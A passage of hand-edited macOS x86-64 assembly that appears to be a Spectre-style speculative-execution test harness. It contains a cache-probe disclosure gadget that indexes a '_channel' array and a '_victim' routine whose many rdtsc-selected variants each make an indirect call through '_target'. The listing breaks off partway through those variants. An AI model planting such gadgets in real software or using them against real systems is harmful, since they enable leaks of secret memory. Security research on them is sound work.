	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_gadget                         ## -- Begin function gadget
	.p2align	4, 0x90
_gadget:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movsbl	(%rax), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_safe_target                    ## -- Begin function safe_target
	.p2align	4, 0x90
_safe_target:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$42, %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_victim                         ## -- Begin function victim
	.p2align	4, 0x90
_victim:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	pushq	%rbx
	.cfi_offset %rbx, -24
	movq	%rdi, -16(%rbp)
	movl	%esi, -20(%rbp)
	movl	$0, -24(%rbp)
	movl	$1, -28(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	movl	%eax, -20(%rbp)
	movl	-20(%rbp), %eax
	andl	-28(%rbp), %eax
	addl	-24(%rbp), %eax
	movl	%eax, -24(%rbp)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$250, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_win0_var99
	cmpl	$100, %eax
	je	.Lvictim_win0_var100
	cmpl	$101, %eax
	je	.Lvictim_win0_var101
	cmpl	$102, %eax
	je	.Lvictim_win0_var102
	cmpl	$103, %eax
	je	.Lvictim_win0_var103
	cmpl	$104, %eax
	je	.Lvictim_win0_var104
	cmpl	$105, %eax
	je	.Lvictim_win0_var105
	cmpl	$106, %eax
	je	.Lvictim_win0_var106
	cmpl	$107, %eax
	je	.Lvictim_win0_var107
	cmpl	$108, %eax
	je	.Lvictim_win0_var108
	cmpl	$109, %eax
	je	.Lvictim_win0_var109
	cmpl	$110, %eax
	je	.Lvictim_win0_var110
	cmpl	$111, %eax
	je	.Lvictim_win0_var111
	cmpl	$112, %eax
	je	.Lvictim_win0_var112
	cmpl	$113, %eax
	je	.Lvictim_win0_var113
	cmpl	$114, %eax
	je	.Lvictim_win0_var114
	cmpl	$115, %eax
	je	.Lvictim_win0_var115
	cmpl	$116, %eax
	je	.Lvictim_win0_var116
	cmpl	$117, %eax
	je	.Lvictim_win0_var117
	cmpl	$118, %eax
	je	.Lvictim_win0_var118
	cmpl	$119, %eax
	je	.Lvictim_win0_var119
	cmpl	$120, %eax
	je	.Lvictim_win0_var120
	cmpl	$121, %eax
	je	.Lvictim_win0_var121
	cmpl	$122, %eax
	je	.Lvictim_win0_var122
	cmpl	$123, %eax
	je	.Lvictim_win0_var123
	cmpl	$124, %eax
	je	.Lvictim_win0_var124
	cmpl	$125, %eax
	je	.Lvictim_win0_var125
	cmpl	$126, %eax
	je	.Lvictim_win0_var126
	cmpl	$127, %eax
	je	.Lvictim_win0_var127
	cmpl	$128, %eax
	je	.Lvictim_win0_var128
	cmpl	$129, %eax
	je	.Lvictim_win0_var129
	cmpl	$130, %eax
	je	.Lvictim_win0_var130
	cmpl	$131, %eax
	je	.Lvictim_win0_var131
	cmpl	$132, %eax
	je	.Lvictim_win0_var132
	cmpl	$133, %eax
	je	.Lvictim_win0_var133
	cmpl	$134, %eax
	je	.Lvictim_win0_var134
	cmpl	$135, %eax
	je	.Lvictim_win0_var135
	cmpl	$136, %eax
	je	.Lvictim_win0_var136
	cmpl	$137, %eax
	je	.Lvictim_win0_var137
	cmpl	$138, %eax
	je	.Lvictim_win0_var138
	cmpl	$139, %eax
	je	.Lvictim_win0_var139
	cmpl	$140, %eax
	je	.Lvictim_win0_var140
	cmpl	$141, %eax
	je	.Lvictim_win0_var141
	cmpl	$142, %eax
	je	.Lvictim_win0_var142
	cmpl	$143, %eax
	je	.Lvictim_win0_var143
	cmpl	$144, %eax
	je	.Lvictim_win0_var144
	cmpl	$145, %eax
	je	.Lvictim_win0_var145
	cmpl	$146, %eax
	je	.Lvictim_win0_var146
	cmpl	$147, %eax
	je	.Lvictim_win0_var147
	cmpl	$148, %eax
	je	.Lvictim_win0_var148
	cmpl	$149, %eax
	je	.Lvictim_win0_var149
	cmpl	$150, %eax
	je	.Lvictim_win0_var150
	cmpl	$151, %eax
	je	.Lvictim_win0_var151
	cmpl	$152, %eax
	je	.Lvictim_win0_var152
	cmpl	$153, %eax
	je	.Lvictim_win0_var153
	cmpl	$154, %eax
	je	.Lvictim_win0_var154
	cmpl	$155, %eax
	je	.Lvictim_win0_var155
	cmpl	$156, %eax
	je	.Lvictim_win0_var156
	cmpl	$157, %eax
	je	.Lvictim_win0_var157
	cmpl	$158, %eax
	je	.Lvictim_win0_var158
	cmpl	$159, %eax
	je	.Lvictim_win0_var159
	cmpl	$160, %eax
	je	.Lvictim_win0_var160
	cmpl	$161, %eax
	je	.Lvictim_win0_var161
	cmpl	$162, %eax
	je	.Lvictim_win0_var162
	cmpl	$163, %eax
	je	.Lvictim_win0_var163
	cmpl	$164, %eax
	je	.Lvictim_win0_var164
	cmpl	$165, %eax
	je	.Lvictim_win0_var165
	cmpl	$166, %eax
	je	.Lvictim_win0_var166
	cmpl	$167, %eax
	je	.Lvictim_win0_var167
	cmpl	$168, %eax
	je	.Lvictim_win0_var168
	cmpl	$169, %eax
	je	.Lvictim_win0_var169
	cmpl	$170, %eax
	je	.Lvictim_win0_var170
	cmpl	$171, %eax
	je	.Lvictim_win0_var171
	cmpl	$172, %eax
	je	.Lvictim_win0_var172
	cmpl	$173, %eax
	je	.Lvictim_win0_var173
	cmpl	$174, %eax
	je	.Lvictim_win0_var174
	cmpl	$175, %eax
	je	.Lvictim_win0_var175
	cmpl	$176, %eax
	je	.Lvictim_win0_var176
	cmpl	$177, %eax
	je	.Lvictim_win0_var177
	cmpl	$178, %eax
	je	.Lvictim_win0_var178
	cmpl	$179, %eax
	je	.Lvictim_win0_var179
	cmpl	$180, %eax
	je	.Lvictim_win0_var180
	cmpl	$181, %eax
	je	.Lvictim_win0_var181
	cmpl	$182, %eax
	je	.Lvictim_win0_var182
	cmpl	$183, %eax
	je	.Lvictim_win0_var183
	cmpl	$184, %eax
	je	.Lvictim_win0_var184
	cmpl	$185, %eax
	je	.Lvictim_win0_var185
	cmpl	$186, %eax
	je	.Lvictim_win0_var186
	cmpl	$187, %eax
	je	.Lvictim_win0_var187
	cmpl	$188, %eax
	je	.Lvictim_win0_var188
	cmpl	$189, %eax
	je	.Lvictim_win0_var189
	cmpl	$190, %eax
	je	.Lvictim_win0_var190
	cmpl	$191, %eax
	je	.Lvictim_win0_var191
	cmpl	$192, %eax
	je	.Lvictim_win0_var192
	cmpl	$193, %eax
	je	.Lvictim_win0_var193
	cmpl	$194, %eax
	je	.Lvictim_win0_var194
	cmpl	$195, %eax
	je	.Lvictim_win0_var195
	cmpl	$196, %eax
	je	.Lvictim_win0_var196
	cmpl	$197, %eax
	je	.Lvictim_win0_var197
	cmpl	$198, %eax
	je	.Lvictim_win0_var198
	cmpl	$199, %eax
	je	.Lvictim_win0_var199
	cmpl	$200, %eax
	je	.Lvictim_win0_var200
	cmpl	$201, %eax
	je	.Lvictim_win0_var201
	cmpl	$202, %eax
	je	.Lvictim_win0_var202
	cmpl	$203, %eax
	je	.Lvictim_win0_var203
	cmpl	$204, %eax
	je	.Lvictim_win0_var204
	cmpl	$205, %eax
	je	.Lvictim_win0_var205
	cmpl	$206, %eax
	je	.Lvictim_win0_var206
	cmpl	$207, %eax
	je	.Lvictim_win0_var207
	cmpl	$208, %eax
	je	.Lvictim_win0_var208
	cmpl	$209, %eax
	je	.Lvictim_win0_var209
	cmpl	$210, %eax
	je	.Lvictim_win0_var210
	cmpl	$211, %eax
	je	.Lvictim_win0_var211
	cmpl	$212, %eax
	je	.Lvictim_win0_var212
	cmpl	$213, %eax
	je	.Lvictim_win0_var213
	cmpl	$214, %eax
	je	.Lvictim_win0_var214
	cmpl	$215, %eax
	je	.Lvictim_win0_var215
	cmpl	$216, %eax
	je	.Lvictim_win0_var216
	cmpl	$217, %eax
	je	.Lvictim_win0_var217
	cmpl	$218, %eax
	je	.Lvictim_win0_var218
	cmpl	$219, %eax
	je	.Lvictim_win0_var219
	cmpl	$220, %eax
	je	.Lvictim_win0_var220
	cmpl	$221, %eax
	je	.Lvictim_win0_var221
	cmpl	$222, %eax
	je	.Lvictim_win0_var222
	cmpl	$223, %eax
	je	.Lvictim_win0_var223
	cmpl	$224, %eax
	je	.Lvictim_win0_var224
	cmpl	$225, %eax
	je	.Lvictim_win0_var225
	cmpl	$226, %eax
	je	.Lvictim_win0_var226
	cmpl	$227, %eax
	je	.Lvictim_win0_var227
	cmpl	$228, %eax
	je	.Lvictim_win0_var228
	cmpl	$229, %eax
	je	.Lvictim_win0_var229
	cmpl	$230, %eax
	je	.Lvictim_win0_var230
	cmpl	$231, %eax
	je	.Lvictim_win0_var231
	cmpl	$232, %eax
	je	.Lvictim_win0_var232
	cmpl	$233, %eax
	je	.Lvictim_win0_var233
	cmpl	$234, %eax
	je	.Lvictim_win0_var234
	cmpl	$235, %eax
	je	.Lvictim_win0_var235
	cmpl	$236, %eax
	je	.Lvictim_win0_var236
	cmpl	$237, %eax
	je	.Lvictim_win0_var237
	cmpl	$238, %eax
	je	.Lvictim_win0_var238
	cmpl	$239, %eax
	je	.Lvictim_win0_var239
	cmpl	$240, %eax
	je	.Lvictim_win0_var240
	cmpl	$241, %eax
	je	.Lvictim_win0_var241
	cmpl	$242, %eax
	je	.Lvictim_win0_var242
	cmpl	$243, %eax
	je	.Lvictim_win0_var243
	cmpl	$244, %eax
	je	.Lvictim_win0_var244
	cmpl	$245, %eax
	je	.Lvictim_win0_var245
	cmpl	$246, %eax
	je	.Lvictim_win0_var246
	cmpl	$247, %eax
	je	.Lvictim_win0_var247
	cmpl	$248, %eax
	je	.Lvictim_win0_var248
	cmpl	$249, %eax
	je	.Lvictim_win0_var249
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 5
.Lvictim_win0_var5:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 6
.Lvictim_win0_var6:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 7
.Lvictim_win0_var7:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 8
.Lvictim_win0_var8:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 9
.Lvictim_win0_var9:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 10
.Lvictim_win0_var10:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 11
.Lvictim_win0_var11:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 12
.Lvictim_win0_var12:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 13
.Lvictim_win0_var13:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 14
.Lvictim_win0_var14:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 15
.Lvictim_win0_var15:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 16
.Lvictim_win0_var16:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 17
.Lvictim_win0_var17:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 18
.Lvictim_win0_var18:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 19
.Lvictim_win0_var19:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 20
.Lvictim_win0_var20:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 21
.Lvictim_win0_var21:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 22
.Lvictim_win0_var22:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 23
.Lvictim_win0_var23:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 24
.Lvictim_win0_var24:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 25
.Lvictim_win0_var25:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 26
.Lvictim_win0_var26:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 27
.Lvictim_win0_var27:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 28
.Lvictim_win0_var28:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 29
.Lvictim_win0_var29:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 30
.Lvictim_win0_var30:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 31
.Lvictim_win0_var31:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 32
.Lvictim_win0_var32:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 33
.Lvictim_win0_var33:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 34
.Lvictim_win0_var34:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 35
.Lvictim_win0_var35:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 36
.Lvictim_win0_var36:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 37
.Lvictim_win0_var37:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 38
.Lvictim_win0_var38:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 39
.Lvictim_win0_var39:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 40
.Lvictim_win0_var40:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 41
.Lvictim_win0_var41:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 42
.Lvictim_win0_var42:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 43
.Lvictim_win0_var43:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 44
.Lvictim_win0_var44:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 45
.Lvictim_win0_var45:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 46
.Lvictim_win0_var46:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 47
.Lvictim_win0_var47:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 48
.Lvictim_win0_var48:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 49
.Lvictim_win0_var49:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 50
.Lvictim_win0_var50:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 51
.Lvictim_win0_var51:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 52
.Lvictim_win0_var52:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 53
.Lvictim_win0_var53:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 54
.Lvictim_win0_var54:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 55
.Lvictim_win0_var55:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
